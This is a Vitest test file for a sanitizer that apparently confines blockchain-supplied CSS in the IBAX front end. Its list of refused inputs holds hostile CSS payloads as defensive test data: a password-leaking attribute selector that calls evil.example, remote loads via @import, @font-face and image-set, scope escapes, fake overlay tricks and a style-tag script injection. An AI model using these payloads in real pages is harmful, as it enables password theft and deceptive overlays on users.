/*---------------------------------------------------------------------------------------------
 *  Copyright (c) IBAX All rights reserved.
 *  See LICENSE in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import React, { act } from 'react';
import { createRoot } from 'react-dom/client';
import { afterEach, beforeEach, describe, it, expect, vi } from 'vitest';
import styledComponent from 'components/Protypo/handlers/StyledComponent';
import { sanitizeTemplateStyle, scopeChainStylesheet } from './chainCss';

// Everything chain CSS must not be able to do, whether it comes as a template style or as an
// ecosystem stylesheet
const REFUSED = [
    // closes the scope: the rest styles the whole app
    'color:red;} body{background:red} .a{',
    // selectors that start elsewhere or reach past the scope
    '*:not(&) { display: none; }',
    ':is(&, .modal-dialog) { opacity: 0; }',
    'html:has(&) .modal { z-index: 1; }',
    'html:has(&) .modal-body::before { content: "Send all funds"; }',
    '& ~ .header { display: none; }',
    '& + * { display: none; }',
    '@scope (html) { .modal { display: none; } }',
    '@layer x { & { color: red; } }',
    // leaks what is typed into a password field, one character at a time
    '& input[type=password][value^="a"] { background: url(https://evil.example/a) }',
    'background-image: image-set("https://evil.example/a" 1x);',
    'background: -webkit-image-set("https://evil.example/a" 1x);',
    '@import "https://evil.example/x.css";',
    '@font-face { font-family: x; src: url(https://evil.example/f) }',
    'background: u\\72l(https://evil.example/a);',
    'back/**/ground: url(x);',
    'background: u/**/rl(https://evil.example/a);',
    'z-index: 1/**/0000;',
    '/* } */ *:not(&) { display: none; }',
    // a fake confirmation laid over the real one
    'position: fixed; inset: 0; z-index: 2147483647;',
    'position: fixed; inset: 0; z-index: 999; background: #fff;',
    'z-index: 9001;',
    'z-index: calc(99999);',
    'z-index: var(--z);',
    'width: 10px; </style><script>alert(1)</script>'
];

describe('chain CSS', () => {
    let warn: ReturnType<typeof vi.spyOn>;
    beforeEach(() => {
        warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    });
    afterEach(() => warn.mockRestore());

    describe('page template styles', () => {
        it('keeps ordinary styles, nested rules included (negative control)', () => {
            for (const css of [
                'color: red; font-size: 12px;',
                'display: flex; gap: 8px; & span { font-weight: 600; }',
                '&:hover { color: blue; } & > .a, & .b { margin: 0; }',
                '& .a:is(.b, .c):not(.d) { color: red; }',
                'background: linear-gradient(#fff, #eee); border: 1px solid rgba(0,0,0,.1);',
                'position: relative; z-index: 2;',
                'position: sticky; top: 0;',
                '@media (max-width: 600px) { display: none; }',
                '@keyframes pulse { from { opacity: 1; } to { opacity: .5; } } animation: pulse 1s;',
                'content: "x";',
                'color: red; /* a note */ & span { /* } */ margin: 0; }'
            ]) {
                expect([css, sanitizeTemplateStyle(css)]).toEqual([css, css]);
            }
            expect(warn).not.toHaveBeenCalled();
        });

        it('refuses styles that reach outside the element or load anything (positive control)', () => {
            for (const css of REFUSED) {
                expect([css, sanitizeTemplateStyle(css)]).toEqual([css, '']);
            }
            expect(warn).toHaveBeenCalledTimes(REFUSED.length);

            // Rendered again: the same answer, not reported again
            for (const css of REFUSED) {
                expect(sanitizeTemplateStyle(css)).toBe('');
            }
            expect(warn).toHaveBeenCalledTimes(REFUSED.length);
        });

        it('ignores what is not a style', () => {
            expect(sanitizeTemplateStyle(undefined)).toBe('');
            expect(sanitizeTemplateStyle({ toString: () => 'color:red' })).toBe('');
        });

        it('styles only the element itself once accepted, nested rules included', async () => {
            (globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;
            const Box = styledComponent<{ children?: React.ReactNode; className?: string }>(props => <div className={props.className}>{props.children}</div>);
            const container = document.createElement('div');
            const root = createRoot(container);
            await act(() => root.render(<Box style="display: flex; & span { color: red; } body { color: blue; }" />));

            const css = [...document.querySelectorAll('style')].map(tag => tag.textContent).join('');
            const className = [...container.firstElementChild.classList].find(name => css.includes(`.${name}{display:flex`));
            expect(className).toBeDefined();
            const rules = css.split('}').filter(rule => rule.includes('color:')).map(rule => rule.split('{')[0].trim());
            expect(rules).toEqual([`.${className} span`, `.${className} body`]);
            await act(() => root.unmount());
        });
    });

    describe('ecosystem stylesheets', () => {
        it('applies only inside the area that shows the ecosystem\'s pages', () => {
            expect(scopeChainStylesheet('.panel { color: red; } h1, .title:hover { margin: 0; } @media (max-width: 1px) { .x { y: z; } }', '.pages')).toBe(
                '.pages .panel{color:red;}.pages h1,.pages .title:hover{margin:0;}@media (max-width: 1px){.pages .x{y:z;}}'
            );
            // A print stylesheet in the printed copy
            expect(scopeChainStylesheet('@page { margin: 1cm; } table { width: 100%; }', 'body')).toBe('@page{margin:1cm;}body table{width:100%;}');
            // Every ecosystem's default print stylesheet on the IBAX testnet (ecosystemparam print_stylesheet)
            expect(scopeChainStylesheet('body {\n\t\t  /* You can define your custom styles here or create custom CSS rules */\n\t}', 'body')).toBe('');
            expect(warn).not.toHaveBeenCalled();
        });

        it('refuses a stylesheet that could reach anything else (positive control)', () => {
            for (const css of REFUSED) {
                expect([css, scopeChainStylesheet(css, '.pages')]).toEqual([css, '']);
            }
            expect(scopeChainStylesheet('.modal { display: none } } .header { display: none }', '.pages')).toBe('');
        });
    });
});
